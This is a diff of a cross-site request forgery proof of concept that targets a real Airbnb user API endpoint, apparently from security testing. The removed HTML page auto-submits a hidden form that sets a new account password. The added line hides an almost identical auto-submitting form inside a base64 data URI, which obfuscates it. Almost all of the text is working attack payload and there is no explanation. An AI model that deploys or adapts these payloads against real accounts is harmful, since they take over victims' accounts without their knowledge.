@@ -1,18 +1,1 @@
-<!DOCTYPE html>
-  <html>
-  <head>
-      <title>CSRF PoC</title>
-  </head>
-  <body>
-      <h3>Standard CSRF PoC</h3>
-      <form action="https://www.airbnb.com/api/v2/users/547505469?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20" method="put">
-      <input type="hidden" name="password" value="Saferefas123456" />
-    <input type="hidden" name="from_review_your_account" value="true" />
-          <input type="submit" value="Submit request" />
-      </form>
-      <script>
-          history.pushState('', '', '/');
-          document.forms[0].submit();
-      </script>
-  </body>
-  </html>
+<script>window.location='data:text/html;base64,PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICA8dGl0bGU+Q1NSRiBQb0M8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogIDxoMz5EYXRhIFVSSSBDU1JGIFBvQzwvaDM+CiAgPGZvcm0gYWN0aW9uPSJodHRwczovL3d3dy5haXJibmIuY29tL2FwaS92Mi91c2Vycy81NDc1MDU0Njk/Y3VycmVuY3k9VVNEJmtleT1kMzA2em95anN5YXJwN2lmaHU2N3JqeG41MnR2MHQyMCZsb2NhbGU9ZW4iIG1ldGhvZD0icHV0Ij4KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InBhc3N3b3JkIiB2YWx1ZT0iU2FmZXJlZmFzMTIzNCIgLz4KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZyb21fcmV2aWV3X3lvdXJfYWNjb3VudCIgdmFsdWU9InRydWUiIC8+CiAgPC9mb3JtPgogIDxzY3JpcHQ+ZG9jdW1lbnQuZm9ybXNbMF0uc3VibWl0KCk7PC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPg==';</script>
